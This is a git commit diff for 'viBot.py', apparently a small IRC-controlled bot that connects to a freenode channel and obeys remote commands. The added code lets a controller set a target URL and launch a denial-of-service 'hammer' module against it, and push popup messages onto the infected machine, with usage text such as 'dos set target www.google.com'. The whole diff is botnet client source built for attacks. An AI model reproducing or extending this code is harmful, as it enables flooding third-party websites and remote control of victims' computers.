d80b2b8c6eb2c38df683b3db52e06ba3fcfc6294
Black Viking <blackvkng@yandex.com>
2017-06-22 12:45:28 +0000

    more stable and usable now

--- viBot.py
+++ viBot.py
@@ -16,9 +16,11 @@ import socket
 import getpass
 import threading
 
+from modules import popup
 from modules import hammer
 
 SERVER = "chat.freenode.net"
+TARGET = None
 CHNL   = "#viBotChannel"
 PORT   = "6667"
 BASE   = "blackvkng"
@@ -29,48 +31,82 @@ IRC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 IRC.connect((SERVER, int(PORT)))
 
 def send(text):
+	''' Send data to IRC channel / user '''
+
 	IRC.send(text+"\n\r")
 
 def login():
+	''' Login to IRC channel '''
+
 	send("USER " + ' '.join([NICK for i in range(4)]))
 	send("NICK " + NICK)
 	send("JOIN " + CHNL)
 
 def recv():
+	''' Receive data from IRC channel / user '''
+
 	while True:
 		msg = IRC.recv(4096)
 
-def start(url):
-	global thread
+def startDos(url):
+	''' Start dos module(hammer) in new thread '''
 	
 	thread = threading.Thread(target=hammer.run, args=(url, ))
 	thread.daemon = True
 	thread.start()
 
+def popupMessage(message):
+	''' Start popup message module in new thread '''
+
+	thread = threading.Thread(target=popup.run, args=(message, ))
+	thread.daemon = True
+	thread.start()
+
+
 def run(msg, priv=False):
+	''' Try to run received text '''
+
 	global TARGET
-	
+
+	message  = msg.split(" ")
 	receiver = BASE if priv == True else CHNL
 
-	if "set target" in msg:
-		msg = msg.split(" ")
+	if message[0] == "dos":
+		if ' '.join(message[1:3]) == "set target":
 
-		TARGET = msg[-1]
+			TARGET = message[-1]
+			send("PRIVMSG %s :%s"%(receiver, "[*] Target: "+TARGET))
 
-		if len(msg) > 3:
-			send("PRIVMSG %s :%s"%(receiver, "Target: "+TARGET))
-
-	elif msg == "start":
-		if TARGET:
-			start(TARGET)
-			send("PRIVMSG %s :%s"%(receiver, "Attack started, Target: "+TARGET))
-		else:
-			pass
+		elif message[-1] == "start":
+			if TARGET != None:
+				startDos(TARGET)
+				send("PRIVMSG %s :%s"%(receiver, "[+] Attack started, Target: "+TARGET))
+			
+			else:
+				pass
 					
+		else:
+			usage  = "[?] Dos module usage: dos set target www.google.com"
+			usage2 = "[?] Dos module usage: dos start"
+			
+			for i in [usage, usage2]:
+				send("PRIVMSG %s :%s"%(receiver, i))
+
+	elif message[0] == "popup":
+		if len(message) > 1:
+			content = ' '.join(message[1:])
+			popupMessage(content)
+		else:
+			usage = "[?] Popup module usage: popup TEXT"
+			send("PRIVMSG %s :%s"%(receiver, usage))
+		
+
 	else:
 		pass
 
 def main():
+	''' Main function '''
+
 	while True:
 		msg = IRC.recv(4096)
 		msg = msg.split()
